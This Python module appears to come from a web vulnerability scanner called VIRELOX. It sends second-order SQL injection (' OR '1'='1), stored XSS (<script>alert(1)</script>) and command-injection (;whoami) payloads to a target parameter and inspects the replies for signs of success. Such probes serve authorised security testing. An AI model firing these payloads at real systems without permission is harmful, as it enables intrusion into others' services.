"""VIRELOX Second-Order / Stored / Command Injection v4.0"""
import re


class _Base:
    def __init__(self, http, log=None, plog=None):
        self.http = http
        self.log = log or (lambda m: None)
        self.plog = plog or self.log

    def test(self, url, param, post_data=None):
        return {"basarili": False}


class SecondOrderInjection(_Base):
    def ikinci_derece_test(self, url, param, http_istemci):
        """Store phase: inject payload via POST, then fetch trigger URL to detect stored injection."""
        payload = "' OR '1'='1"
        tetikleyici = url
        try:
            # Store phase — POST the payload
            http_istemci.post(url, data={param: payload}, timeout=10)
            # Trigger phase — fetch the URL and look for injection evidence
            yanit = http_istemci.get(tetikleyici, timeout=10)
            metin = yanit.text if hasattr(yanit, "text") else ""
            basarili = (
                "1=1" in metin
                or "syntax error" in metin.lower()
                or "mysql" in metin.lower()
                or payload in metin
            )
            return {"basarili": basarili, "payload": payload, "tetikleyici": tetikleyici}
        except Exception as e:
            self.log(f"SecondOrderInjection hatası: {e}")
            return {"basarili": False, "payload": payload, "tetikleyici": tetikleyici}


class StoredInjection(_Base):
    def depolanan_xss_test(self, url, param, http_istemci):
        """Inject <script>alert(1)</script> via form submit, detect in response."""
        payload = "<script>alert(1)</script>"
        try:
            http_istemci.post(url, data={param: payload}, timeout=10)
            yanit = http_istemci.get(url, timeout=10)
            metin = yanit.text if hasattr(yanit, "text") else ""
            basarili = payload in metin or "alert(1)" in metin
            return {"basarili": basarili, "payload": payload}
        except Exception as e:
            self.log(f"StoredInjection hatası: {e}")
            return {"basarili": False, "payload": payload}

    def test(self, url, param, post_data=None):
        return self.depolanan_xss_test(url, param, self.http)


class CommandInjectionViaSql(_Base):
    def komut_enjeksiyon_test(self, url, param, http_istemci):
        """Inject ;whoami, check response for 'root' or uid patterns."""
        payload = ";whoami"
        uid_pattern = re.compile(r"uid=\d+\(\w+\)", re.IGNORECASE)
        try:
            yanit = http_istemci.post(url, data={param: payload}, timeout=10)
            metin = yanit.text if hasattr(yanit, "text") else ""
            basarili = (
                "root" in metin.lower()
                or bool(uid_pattern.search(metin))
                or "www-data" in metin.lower()
                or "daemon" in metin.lower()
            )
            return {"basarili": basarili, "payload": payload, "cikti": metin[:200]}
        except Exception as e:
            self.log(f"CommandInjection hatası: {e}")
            return {"basarili": False, "payload": payload, "cikti": ""}

    def test(self, url, param, post_data=None):
        return self.komut_enjeksiyon_test(url, param, self.http)
